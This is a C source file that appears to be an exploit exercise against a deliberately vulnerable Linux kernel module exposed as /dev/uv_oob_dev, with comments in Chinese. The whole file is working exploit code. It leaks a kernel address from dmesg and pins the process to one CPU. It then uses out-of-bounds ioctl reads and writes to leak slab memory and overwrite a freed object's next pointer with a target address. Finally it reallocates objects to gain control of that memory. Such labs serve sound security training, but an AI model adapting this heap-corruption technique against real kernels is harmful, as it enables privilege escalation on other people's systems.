#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEVICE_PATH "/dev/uv_oob_dev"

#define IOCTL_MAGIC 'Y'
#define IOCTL_ALLOC_VULN _IOWR(IOCTL_MAGIC, 0x01, int)
#define IOCTL_FREE_VULN _IOW(IOCTL_MAGIC, 0x02, int)
#define IOCTL_WRITE_VULN _IOW(IOCTL_MAGIC, 0x03, int)
#define IOCTL_READ_VULN _IOR(IOCTL_MAGIC, 0x04, int)
#define IOCTL_ALLOC_ELS _IOWR(IOCTL_MAGIC, 0x05, int)
#define IOCTL_FREE_ELS _IOW(IOCTL_MAGIC, 0x06, int)
#define IOCTL_WRITE_ELS _IOW(IOCTL_MAGIC, 0x07, int)
#define IOCTL_READ_ELS _IOR(IOCTL_MAGIC, 0x08, int)
#define IOCTL_ALLOC_VICTIM _IOWR(IOCTL_MAGIC, 0x09, int)
#define IOCTL_FREE_VICTIM _IOW(IOCTL_MAGIC, 0x0A, int)
#define IOCTL_WRITE_VICTIM _IOW(IOCTL_MAGIC, 0x0B, int)
#define IOCTL_READ_VICTIM _IOR(IOCTL_MAGIC, 0x0C, int)
#define IOCTL_EXECUTE_VICTIM _IOW(IOCTL_MAGIC, 0x0D, int)

struct request_arg {
  int handler;
  int offset;
  int length;
  char *value;
};

// 从 dmesg 日志中获取模块初始化时打印的 victimptr 地址
unsigned long get_victim_addr() {
  FILE *fp = popen("dmesg | grep 'victimptr'", "r");
  if (!fp)
    return 0;
  char line[256];
  unsigned long addr = 0;
  while (fgets(line, sizeof(line), fp)) {
    char *p = strstr(line, "victimptr: 0x");
    if (p) {
      sscanf(p, "victimptr: 0x%lx", &addr);
    }
  }
  pclose(fp);
  return addr;
}

int main() {
  int fd;
  int oob_handler1, oob_handler2, oob_handler3, oob_handler4;
  unsigned long payload;
  struct request_arg req;

  printf("[*] Kernel OOB Exploit Simulation\n");

  // 0. 获取 victimptr 的内核地址
  unsigned long victim_addr = get_victim_addr();
  if (victim_addr == 0) {
    printf("[-] Failed to find victimptr address from dmesg.\n");
    printf("[-] Ensure the modulo is loaded and dmesg has the address.\n");
    return -1;
  }
  printf("[+] Found victimptr address: 0x%lx\n", victim_addr);

  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
    perror("[-] sched_setaffinity failed");
    return -1;
  }
  printf("[+] Process pinned to CPU 0.\n");

  // 打开设备
  fd = open(DEVICE_PATH, O_RDWR);
  if (fd < 0) {
    perror("[-] Failed to open the device");
    return -1;
  }
  printf("[+] Device opened successfully.\n");

  if (ioctl(fd, IOCTL_ALLOC_VULN, &oob_handler1) < 0) {
    perror("[-] Failed to allocate OOB vuln");
    close(fd);
    return -1;
  }
  printf("[+] Allocated OOB vuln with handler: %d\n", oob_handler1);

  if (ioctl(fd, IOCTL_ALLOC_VULN, &oob_handler2) < 0) {
    perror("[-] Failed to allocate second OOB vuln");
    close(fd);
    return -1;
  }
  printf("[+] Allocated second OOB vuln with handler: %d\n", oob_handler2);

  if (ioctl(fd, IOCTL_FREE_VULN, &oob_handler1) < 0) {
    perror("[-] Failed to free first OOB vuln");
    close(fd);
    return -1;
  }
  printf("[+] Freed first OOB vuln with handler: %d\n", oob_handler1);

  char buffer[520];
  req.handler = oob_handler2;
  req.offset = 520;
  req.length = 520;
  req.value = buffer;
  if (ioctl(fd, IOCTL_READ_VULN, &req) < 0) {
    perror("[-] Failed to read from second OOB vuln");
    close(fd);
    return -1;
  }
  unsigned long *leaked_data = NULL;
  leaked_data = (unsigned long *)req.value;
  for (int i = 0; i < 520 / 8; i++) {
    printf("[+] Leaked data[%d]: 0x%lx\n", i, leaked_data[i]);
  }

  printf("[+] Overwriting nextptr with victim address...\n");
  payload = victim_addr;
  req.handler = oob_handler2;
  req.offset = 520 + 32 * 8;
  req.length = 8; // next指针大小为 8 字节
  req.length = sizeof(payload);
  req.value = (char *)&payload;

  if (ioctl(fd, IOCTL_WRITE_VULN, &req) < 0) {
    perror("[-] Failed to OOB write");
    close(fd);
    return -1;
  }
  printf("[+] Overwrite done.\n");

  req.handler = oob_handler2;
  req.offset = 520;
  req.length = 520;
  if (ioctl(fd, IOCTL_READ_VULN, &req) < 0) {
    perror("[-] Failed to read from second OOB vuln");
    close(fd);
    return -1;
  }
  leaked_data = (unsigned long *)req.value;
  for (int i = 0; i < 520 / 8; i++) {
    printf("[+] Leaked data[%d]: 0x%lx\n", i, leaked_data[i]);
  }

  if (ioctl(fd, IOCTL_ALLOC_VULN, &oob_handler3) < 0) {
    perror("[-] Failed to allocate third OOB vuln");
    close(fd);
    return -1;
  }
  printf("[+] Allocated third OOB vuln with handler: %d\n", oob_handler3);

  if (ioctl(fd, IOCTL_ALLOC_VULN, &oob_handler4) < 0) {
    perror("[-] Failed to allocate fourth OOB vuln");
    close(fd);
    return -1;
  }
  printf("[+] Allocated fourth OOB vuln with handler: %d\n", oob_handler4);

  req.handler = oob_handler4;
  req.offset = 8;
  req.length = sizeof("victim");
  if (ioctl(fd, IOCTL_READ_VULN, &req) < 0) {
    perror("[-] Failed to read from fourth OOB vuln");
    close(fd);
    return -1;
  }
  printf("[+] Read from fourth OOB vuln: %s\n", req.value);

  close(fd);
  return 0;
}